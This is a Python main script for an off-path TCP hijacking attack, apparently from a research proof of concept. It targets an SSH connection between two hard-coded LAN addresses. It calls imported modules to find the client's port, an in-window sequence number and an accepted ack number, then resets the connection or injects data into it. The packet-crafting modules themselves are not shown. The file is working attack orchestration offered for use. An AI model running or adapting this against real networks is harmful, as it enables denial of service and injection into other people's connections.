#!/usr/bin/python
import time
import argparse

from port_find import Port_Finder
from seq_find import Seq_Finder
from ack_find import Ack_Finder
from attack import Attacker

def main():

    ##### Configuration parameters #####
    client_mac = "70:ae:d5:3b:40:90"
    client_ip = "192.168.50.104"
    server_ip = "192.168.50.128"
    server_port = 22                                       
    send_if_name = "wlan0"
    sniff_if_name = ["wlan1"]

    start_port=49152
    end_port=65535
    step_size=32
    packet_repeat=1

    ##### Attack type #####
    attack_type = "DoS"
    
    port = Port_Finder(client_ip=client_ip, server_ip=server_ip, server_port=server_port, 
                        start_port=start_port, end_port=end_port, send_if_name=send_if_name, 
                        sniff_if_name=sniff_if_name, client_mac=client_mac, step_size=step_size, 
                        packet_repeat=packet_repeat)


    port.run()
    client_port = port.result
    if client_port == -1:
        print("[-] Find the port fail")
        exit(1)

    seq = Seq_Finder(client_mac=client_mac, client_ip=client_ip, server_ip=server_ip, 
                     client_port=client_port, server_port=server_port, send_if_name=send_if_name, 
                     sniff_if_name=sniff_if_name, seq_window_size=131071, step_size=32, repeat_time=10)
    seq.run()

    if seq.result == -1:
        print("[-] Find the seq in window fail")
        exit(1)
    client_seq_in_window = seq.result + (1<<14)
    client_seq_next = seq.result + 1
    
    ack = Ack_Finder(client_mac=client_mac, client_ip=client_ip, server_ip=server_ip, 
                     client_port=client_port, server_port=server_port, seq_in_window=client_seq_in_window, 
                     send_if_name=send_if_name, sniff_if_name=sniff_if_name, seq_window_size=131071)
    ack.run()
    client_ack_in_window = ack.ack_in_window

    if client_ack_in_window == -1:
        print("[-] Find ack in window fail")
        exit(1)


    print("The TCP connection information:")
    print("--------------------------------------------------")
    print("[+] the client IP: %s" %client_ip)
    print("[+] the client port: %d" %client_port)
    print("[+] the server IP: %s" %server_ip)
    print("[+] the server port: %d" %server_port)
    print("[+] the server accept ack: %d" %client_ack_in_window)
    print("[+] the server next seq: %d" %client_seq_next)

    attack = Attacker(client_ip=client_ip, server_ip=server_ip, client_port=client_port, 
                      server_port=server_port,  seq_in_window=client_seq_in_window, seq_window_size=65535, send_if_name=send_if_name)
    if attack_type == "DoS":
        attack.TCP_dos()
    elif attack_type == "Inject":
        attack.TCP_inject()

if __name__ == "__main__":
    main()
    
